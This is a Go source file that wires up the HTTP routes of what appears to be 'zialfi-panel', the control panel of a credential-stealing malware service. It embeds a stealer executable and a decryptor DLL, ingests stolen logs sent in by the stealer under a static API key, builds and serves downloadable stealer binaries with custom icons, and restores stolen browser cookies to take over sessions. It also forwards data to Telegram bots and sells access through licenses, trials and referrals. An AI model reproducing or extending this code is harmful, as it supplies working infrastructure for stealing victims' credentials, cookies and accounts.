package api

import (
	"context"
	"database/sql"
	"net/http"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"zialfi-panel/internal/auth"
	"zialfi-panel/internal/db"
	"zialfi-panel/internal/middleware"
	"zialfi-panel/internal/services"
	"zialfi-panel/internal/ws"
)

func AuthMiddleware(secret string) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			header := r.Header.Get("Authorization")
			if header == "" || !strings.HasPrefix(header, "Bearer ") {
				writeError(w, http.StatusUnauthorized, "missing or invalid authorization header")
				return
			}

			tokenStr := strings.TrimPrefix(header, "Bearer ")
			claims, err := auth.ValidateToken(tokenStr, secret)
			if err != nil {
				writeError(w, http.StatusUnauthorized, "invalid or expired token")
				return
			}

			ctx := middleware.ContextWithClaims(r.Context(), claims)
			next.ServeHTTP(w, r.WithContext(ctx))
		})
	}
}

func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.Hub, stealerExe, decryptorDll []byte, provider db.ProviderType) {
	authHandler := NewAuthHandler(db, jwtSecret, provider)
	usersHandler := NewUsersHandler(db, jwtSecret)
	statsHandler := NewStatsHandler(db, hub)
	logProc := services.NewLogProcessor(db, hub, provider)
	logsHandler := NewLogsHandler(logProc)
	sessionsHandler := NewSessionsHandler(db)
	searchHandler := NewSearchHandler(db)
	buildHandler := NewBuildHandler(services.NewBuildService(), stealerExe, decryptorDll, db)
	notesHandler := NewNotesHandler(db)
	exportHandler := NewExportHandler(db)
	settingsHandler := NewSettingsHandler(db, jwtSecret)
	restoreHandler := NewRestoreHandler(db)
	chatHandler := NewChatHandler(db, hub)
	ticketHandler := NewTicketHandler(db)
	marketplaceHandler := NewMarketplaceHandler(db)
	totpHandler := NewTOTPHandler(db)
	sessMgmtHandler := NewSessionMgmtHandler(db)
	apiKeyHandler := NewAPIKeyHandler(db)
	docsHandler := NewDocsHandler()
	publicStatsHandler := NewPublicStatsHandler(db)
	pricingHandler := NewPricingHandler(db, provider)
	referralHandler := NewReferralHandler(db, provider)
	systemHealthHandler := NewSystemHealthHandler()

	telegramBotHandler := NewTelegramBotHandler(db)
	teamHandler := NewTeamHandler(db)
	auditHandler := NewAuditHandler(db)
	banAPIHandler := NewBanHandler(db)
	r.Group(func(r chi.Router) {
		r.Post("/api/auth/login", authHandler.Login)
		r.Post("/api/auth/register", usersHandler.Register)
		r.With(middleware.RateLimit(10, time.Minute)).Post("/api/auth/2fa/verify-login", authHandler.VerifyLogin)
		r.With(middleware.RateLimit(3, 15*time.Minute)).Post("/api/auth/forgot-password", authHandler.ForgotPassword)
		r.With(middleware.RateLimit(5, 15*time.Minute)).Post("/api/auth/reset-password", authHandler.ResetPassword)
		r.Get("/api/auth/2fa/required", totpHandler.Required)
		r.Get("/api/public/stats", publicStatsHandler.GetPublicStats)
		r.Get("/api/pricing", pricingHandler.ListTiers)
	})

	// Log ingestion — protected by API key (static token from stealer), not JWT
	r.Group(func(r chi.Router) {
		r.Use(middleware.APIKeyAuth(db))

		r.Post("/api/log", logsHandler.Ingest)
		r.Post("/api/log/chunk", logsHandler.Chunk)
		r.Post("/api/log/complete", logsHandler.CompleteChunked)
	})

	r.Group(func(r chi.Router) {
		r.Use(AuthMiddleware(jwtSecret))

		r.Get("/api/auth/me", authHandler.Me)

		// TOTP
		r.Post("/api/auth/2fa/setup", totpHandler.Setup)
		r.Post("/api/auth/2fa/verify", totpHandler.Verify)
		r.Post("/api/auth/2fa/disable", totpHandler.Disable)

		// Session management
		r.Get("/api/auth/sessions", sessMgmtHandler.List)
		r.Delete("/api/auth/sessions/{id}", sessMgmtHandler.Terminate)
		r.Delete("/api/auth/sessions", sessMgmtHandler.TerminateAll)

		// API keys
		r.Post("/api/keys", apiKeyHandler.Create)
		r.Get("/api/keys", apiKeyHandler.List)
		r.Delete("/api/keys/{id}", apiKeyHandler.Delete)

		r.Get("/api/stats", statsHandler.Dashboard)

		r.Get("/api/system/health", systemHealthHandler.Health)

		// Docs (auth required)
		r.Get("/api/docs", docsHandler.List)
		r.Get("/api/docs/*", docsHandler.Get)

		r.Get("/api/sessions", sessionsHandler.List)
		r.Get("/api/sessions/{id}", sessionsHandler.Detail)
		r.Delete("/api/sessions/{id}", sessionsHandler.Delete)
		r.Post("/api/sessions/{id}/lock", sessionsHandler.Lock)
		r.Post("/api/sessions/{id}/unlock", sessionsHandler.Unlock)

		r.Get("/api/search", searchHandler.Search)
		r.Get("/api/search/advanced", searchHandler.AdvancedSearch)

		detectHandler := NewDuplicateDetectHandler(db)
		r.Get("/api/detect/duplicates", detectHandler.Detect)

		domainDetectHandler := NewDomainDetectHandler(db, provider)
		r.Get("/api/domain-detect", domainDetectHandler.List)
		r.Post("/api/domain-detect", domainDetectHandler.Create)
		r.Delete("/api/domain-detect/{id}", domainDetectHandler.Delete)
		r.Post("/api/sessions/{id}/auto-tag", domainDetectHandler.AutoTag)

		r.Get("/api/filter-presets", NewFilterPresetsHandler(db).List)

		screenshotsHandler := NewScreenshotsHandler(db)
		r.Get("/api/sessions/{id}/screenshot", screenshotsHandler.Get)
		r.With(middleware.RequireRole("admin")).Delete("/api/sessions/{id}/screenshot", screenshotsHandler.Delete)

		sspHandler := NewSSPHandler(logProc)
		r.Post("/api/log/ssp", sspHandler.ProcessSSP)

		r.Route("/api/build", func(r chi.Router) {
			r.Post("/", buildHandler.Build)
			r.Get("/", buildHandler.List)
			r.Get("/stats", buildHandler.Stats)
			r.Get("/{id}/download", buildHandler.Download)
		})

		r.Get("/api/sessions/{id}/notes", notesHandler.List)
		r.Post("/api/sessions/{id}/notes", notesHandler.Create)
		r.Delete("/api/notes/{id}", notesHandler.Delete)

		r.Get("/api/export/session/{id}", exportHandler.ExportSession)
		r.Post("/api/export/bulk", exportHandler.ExportBulk)

		r.Get("/api/settings", settingsHandler.Get)
		r.Put("/api/settings", settingsHandler.Update)

		// Cookie restore
		r.Post("/api/restore/cookies", restoreHandler.Restore)
		r.Post("/api/restore/cookies/upload", restoreHandler.UploadCookies)
		r.Get("/api/restore/sessions", restoreHandler.ListSessions)
		r.Get("/api/restore/sessions/{id}", restoreHandler.SessionStatus)

		r.With(middleware.RequireRole("admin")).Get("/api/users", usersHandler.List)
		r.With(middleware.RequireRole("admin")).Post("/api/users/invite", usersHandler.CreateInvite)

		// Chat
		r.Get("/api/chat/messages", chatHandler.List)
		r.Post("/api/chat/messages", chatHandler.Send)
		r.With(middleware.RequireRole("admin")).Delete("/api/chat/messages/{id}", chatHandler.Delete)

		// Support Tickets
		r.Post("/api/support/tickets", ticketHandler.Create)
		r.Get("/api/support/tickets", ticketHandler.List)
		r.Get("/api/support/tickets/{id}", ticketHandler.Get)
		r.Post("/api/support/tickets/{id}/reply", ticketHandler.Reply)
		r.Post("/api/support/tickets/{id}/close", ticketHandler.Close)

		// Marketplace
		r.Get("/api/marketplace/products", marketplaceHandler.ListProducts)
		r.Post("/api/marketplace/purchase", marketplaceHandler.Purchase)
		r.Post("/api/marketplace/activate", marketplaceHandler.Activate)
		r.Get("/api/marketplace/purchases", marketplaceHandler.MyPurchases)
		r.Post("/api/marketplace/renew", marketplaceHandler.RenewLicense)
		r.Post("/api/marketplace/upgrade", marketplaceHandler.UpgradeLicense)
		r.Get("/api/marketplace/license-status", marketplaceHandler.LicenseStatus)
		r.Post("/api/auth/start-trial", marketplaceHandler.StartTrial)
		r.With(middleware.RequireRole("admin")).Post("/api/marketplace/products", marketplaceHandler.CreateProduct)
		r.With(middleware.RequireRole("admin")).Delete("/api/marketplace/products/{id}", marketplaceHandler.DeleteProduct)

		// Pricing & License features
		r.Get("/api/license/features", pricingHandler.MyFeatures)

		// Referrals
		r.Get("/api/referrals/code", referralHandler.GetCode)
		r.Post("/api/referrals/apply", referralHandler.Apply)
		r.Get("/api/referrals/stats", referralHandler.Stats)

		// Proxies
		rotator := services.NewProxyRotator(nil)
		store := services.NewSettingsStore(
			func(key string) (string, error) {
				var val string
				err := db.QueryRow("SELECT value FROM settings WHERE key = ?", key).Scan(&val)
				return val, err
			},
			func(key, value string) error {
				_, err := db.Exec("INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value", key, value)
				return err
			},
		)
		if entries, err := services.LoadProxies(store); err == nil {
			for _, e := range entries {
				rotator.Add(e)
			}
		}
		proxyHandler := services.NewProxyRotatorHandler(rotator, store)
		go rotator.HealthCheck(context.Background(), 5*time.Minute)

		r.With(middleware.RequireRole("admin")).Get("/api/proxies", proxyHandler.ListProxies)
		r.With(middleware.RequireRole("admin")).Post("/api/proxies", proxyHandler.AddProxy)
		r.With(middleware.RequireRole("admin")).Delete("/api/proxies/{id}", proxyHandler.DeleteProxy)

		// Telegram bots
		r.Get("/api/telegram/bots", telegramBotHandler.List)
		r.Post("/api/telegram/bots", telegramBotHandler.Create)
		r.Put("/api/telegram/bots/{id}", telegramBotHandler.Update)
		r.Delete("/api/telegram/bots/{id}", telegramBotHandler.Delete)
		r.Post("/api/telegram/bots/{id}/test", telegramBotHandler.Test)
		r.Get("/api/telegram/filters", telegramBotHandler.ListFilters)
		r.Post("/api/telegram/filters", telegramBotHandler.CreateFilter)
		r.Delete("/api/telegram/filters/{id}", telegramBotHandler.DeleteFilter)

		// Team management (admin only — prevents privilege escalation)
		r.With(middleware.RequireRole("admin")).Get("/api/team", teamHandler.List)
		r.With(middleware.RequireRole("admin")).Put("/api/team/{id}/role", teamHandler.ChangeRole)
		r.With(middleware.RequireRole("admin")).Delete("/api/team/{id}", teamHandler.Remove)

		// Audit log (admin only)
		r.With(middleware.RequireRole("admin")).Get("/api/audit", auditHandler.List)
		r.Get("/api/audit/stats", auditHandler.Stats)

		// Ban management (admin only)
		r.With(middleware.RequireRole("admin")).Get("/api/bans", banAPIHandler.List)
		r.With(middleware.RequireRole("admin")).Post("/api/bans", banAPIHandler.Create)
		r.With(middleware.RequireRole("admin")).Delete("/api/bans/{id}", banAPIHandler.Delete)

		// Build tag/icon
		r.Put("/api/build/{id}/tag", buildHandler.UpdateTag)
		r.Post("/api/build/{id}/icon", buildHandler.UploadIcon)
	})
}
